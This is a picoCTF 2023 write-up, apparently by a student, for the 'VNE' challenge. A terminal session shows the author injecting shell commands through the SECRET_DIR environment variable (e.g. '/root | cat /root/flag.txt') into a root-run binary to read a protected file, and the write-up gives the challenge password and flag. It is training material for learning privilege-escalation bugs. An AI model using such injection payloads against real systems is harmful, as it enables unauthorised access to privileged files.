### VNE

#Medium #Binary_Exploitation #picoCTF #2023 #bash #env #injection

Author: Junias Bonou

#### Description

We've got a binary that can list directories as root, try it out !!`ssh` to `saturn.picoctf.net:59756`, and run the binary named "bin" once connected. Login as `ctf-player` with the password, `fd7746b4`

```css
┌──(kali㉿kali)-[~]
└─$ ssh -p 56238 ctf-player@saturn.picoctf.net
The authenticity of host '[saturn.picoctf.net]:56238 ([13.59.203.175]:56238)' can't be established.
ED25519 key fingerprint is SHA256:HPhB80jvwzwsykN/XSDUt9zGDYpkIHHd9PMoDlkzWpw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[saturn.picoctf.net]:56238' (ED25519) to the list of known hosts.
ctf-player@saturn.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1023-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

ctf-player@pico-chall$ ls
bin
ctf-player@pico-chall$ ./bin
Error: SECRET_DIR environment variable is not set
ctf-player@pico-chall$ export SECRET_DIR="/root"
ctf-player@pico-chall$ ./bin
Listing the content of /root as root: 
flag.txt
ctf-player@pico-chall$ export SECRET_DIR="cat /root/flag.txt"
ctf-player@pico-chall$ ./bin
Listing the content of cat /root/flag.txt as root: 
ls: cannot access 'cat': No such file or directory
/root/flag.txt
Error: system() call returned non-zero value: 512
ctf-player@pico-chall$ export SECRET_DIR="/root |ls"
ctf-player@pico-chall$ ./bin
Listing the content of /root |ls as root: 
bin
ctf-player@pico-chall$ export SECRET_DIR="/root | cat /root/flag.txt"
ctf-player@pico-chall$ ./bin
Listing the content of /root | cat /root/flag.txt as root: 
picoCTF{Power_t0_man!pul4t3_3nv_fc3ff2c9}ctf-player@pico-chall$

```

flag is `picoCTF{Power_t0_man!pul4t3_3nv_fc3ff2c9}`